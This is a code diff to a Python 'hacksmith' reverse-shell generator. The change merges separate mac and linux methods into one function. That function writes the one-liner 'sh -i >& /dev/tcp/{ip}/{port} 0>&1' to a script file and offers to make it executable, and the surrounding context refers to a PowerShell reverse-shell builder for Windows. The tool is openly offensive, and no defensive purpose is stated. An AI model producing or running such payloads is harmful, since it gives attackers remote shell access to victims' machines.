@@ -15,8 +15,8 @@ class Dozer:
         """
         initialization for hacksmith tool
         """
-        if not self._check_ip(ip):
-            self._error("invalid ip")
+        if not self.__check_ip(ip):
+            self.__error("invalid ip")
         self.ip = ip
         self.port = port
         self.os = os
@@ -35,10 +35,10 @@ class Dozer:
                 print("creating revshell for windows")
                 self.windows_rev_shell()
             case "linux":
-                print("creating revshell for linux")
+                self.mac_linux_shell()
             case "mac":
                 print("creating revshell for mac")
-                self.mac_rev_shell()
+                self.mac_linux_shell()
             case "android":
                 print("creating revshell for android")
             case "ios":
@@ -88,10 +88,13 @@ $StreamWriter.Close()
             f.write(ps_script)
             print(f"created {self.output_filename} file")
 
-    def mac_rev_shell(self):
-        mac_script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
+    def mac_linux_shell(self):
+        """
+        mac and linux has same rev shell, fuck your naming patterns
+        """
+        script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
         with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
-            f.write(mac_script)
+            f.write(script)
             print(f"created {self.output_filename}.sh")
             user_input = input("do you wanna make it executable (Y/n): ").lower()
             if user_input == "y":
@@ -99,14 +102,14 @@ $StreamWriter.Close()
                 subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
                 print("revshell is now exectuable!")
 
-    def _check_ip(self, ip: str):
+    def __check_ip(self, ip: str):
         try:
             ipaddress.ip_address(ip)
             return True
         except ValueError:
             return False
 
-    def _error(self, err_message: str):
+    def __error(self, err_message: str):
         print(err_message)
         sys.exit(1)
 
